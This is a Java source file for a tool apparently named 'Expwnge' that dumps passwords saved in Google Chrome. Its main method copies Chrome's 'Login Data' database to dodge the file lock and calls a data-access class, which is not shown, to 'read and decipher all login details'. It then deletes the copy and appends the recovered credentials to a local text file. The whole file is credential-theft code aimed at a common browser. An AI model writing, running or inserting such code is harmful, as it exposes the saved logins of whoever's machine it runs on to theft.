package hax.expwnge;

import static hax.expwnge.models.Login.LOGIN_TABLE_FACTORY;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.StandardOpenOption;
import java.util.List;

import org.apache.log4j.Logger;

import hax.expwnge.dao.LoginDAO;
import hax.expwnge.models.Login;

public class Expwnge {
  private static final Logger LOGGER = Logger.getLogger(Expwnge.class);

  /**
   * Register SQLite JDBC Driver
   */
  static {
    try {
      Class.forName("org.sqlite.JDBC");
    } catch (ClassNotFoundException e) {
      LOGGER.error(e);
    }
  }

  private Expwnge() {
    //Do not instantiate.
  }

  public static void main(String[] args) {
    String chromeFolder = System.getenv("LOCALAPPDATA")+"/Google/Chrome/User Data/Default/";
    
    /** Copy file to dance around database file lock **/
    Path resultPath = null;
    try {
      resultPath = Files.copy(Paths.get(chromeFolder+"Login Data"), Paths.get(chromeFolder+"MyData Copy"), StandardCopyOption.REPLACE_EXISTING);
    } catch (Exception e) {
      LOGGER.error(e);
    }

    /** Read and decipher all login details **/
    List<Login> logins = new LoginDAO().getLoginDetails(resultPath);
    
    /** Delete the database copy **/
    try {
      Files.delete(resultPath);
    } catch (Exception e) {
      LOGGER.error(e);
    }

    /** Store formatted data **/
    try {
      Files.write(Paths.get("expwnged.txt"), LOGIN_TABLE_FACTORY.new Table(logins).getContent(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
    } catch (Exception e) {
      LOGGER.error(e);
    }
  }
}
